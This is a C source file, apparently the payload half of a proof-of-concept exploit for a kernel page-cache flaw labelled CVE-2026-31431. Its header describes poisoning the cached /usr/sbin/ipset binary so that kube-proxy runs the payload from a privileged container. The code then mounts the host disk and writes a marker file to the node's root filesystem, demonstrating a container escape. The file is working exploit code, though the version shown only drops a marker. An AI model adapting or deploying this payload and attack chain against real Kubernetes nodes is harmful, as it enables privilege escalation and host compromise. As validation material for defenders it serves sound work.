/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
/*
 * Copy Fail (CVE-2026-31431) -- payload.
 *
 * ACK validation payload adapted from Tony Gies' cross-platform C payload:
 * https://github.com/tgies/copy-fail-c
 *
 * The upstream payload implementation is dual-licensed under
 * LGPL-2.1-or-later OR MIT. This derived payload keeps the same terms.
 *
 * Cross-platform shellcode, built against the kernel's nolibc/ tiny libc.
 * payload.c is plain portable C; the per-arch syscall asm lives in
 * nolibc/arch-*.h. Supported architectures (per nolibc upstream): x86_64,
 * i386, arm, aarch64, riscv32/64, mips, ppc, s390x, loongarch, m68k, sh,
 * sparc.
 *
 * nolibc doesn't ship setuid/setgid wrappers, so we use its variadic
 * syscall() macro (nolibc/sys/syscall.h) with __NR_* constants from the
 * toolchain's <asm/unistd.h>. Still no embedded asm in this file.
 *
 * Runtime story: the dropper writes these bytes over the head of
 * /usr/sbin/ipset's page-cache pages. kube-proxy later executes ipset
 * from its privileged container context and loads these bytes from the
 * poisoned cache. This ACK validation variant mounts the host disk and
 * writes a marker file to prove execution reached the node filesystem.
 *
 * Build: see Makefile. (`make` in this directory.)
 */

#include "nolibc/nolibc.h"

 /* nolibc doesn't ship setuid/setgid wrappers (the kernel selftests it's
  * designed for don't need them). It does ship a portable variadic
  * syscall() macro (see nolibc/sys/syscall.h) and an execve(). The
  * __NR_* constants come from the toolchain's <asm/unistd.h>. */
 int main(void) {
     const char msg[] = "[*] success";
     int fd;
 
     mkdir("/mnt", 0755);
 
     if (mount("/dev/vda3", "/mnt", "ext4", 0, NULL))
         return 1;
 
     fd = open("/mnt/root/res", O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd < 0)
         return 1;
 
     if (write(fd, msg, sizeof(msg) - 1) != (ssize_t)(sizeof(msg) - 1)) {
         close(fd);
         return 1;
     }
 
     close(fd);
 
     return 0;
 }
 